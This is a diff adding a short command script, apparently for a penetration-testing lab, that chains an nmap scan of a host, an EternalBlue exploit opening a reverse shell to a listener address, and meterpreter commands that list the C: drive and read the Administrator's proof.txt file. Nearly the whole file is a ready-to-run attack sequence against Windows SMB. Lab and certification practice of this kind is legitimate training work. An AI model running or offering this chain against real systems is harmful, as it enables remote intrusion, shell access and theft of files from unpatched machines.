@@ -1,0 +1,16 @@
+# SCAN THE BOX
+db_nmap; set delay_to_observe 1; set dst_ip 10.11.1.75;  options; set mode top_10000; run;
+
+# exploit eternalblue
+eternalblue; set delay_to_observe 30; set lhost 192.168.119.154; set lport <REVSHELL_PORT>; set rhost 10.11.1.75; run;
+
+# list sessions
+sessions
+
+# execute dir on the session
+execute_meterpreter_command_in_session; set command dir C:\\; run;
+
+# try to find the proof.txt file
+execute_meterpreter_command_in_session; set command search -d C:\\ -f proof.txt; run;
+
+execute_meterpreter_command_in_session; set command cat C:\\Users\\Administrator\\Desktop\\proof.txt; run;
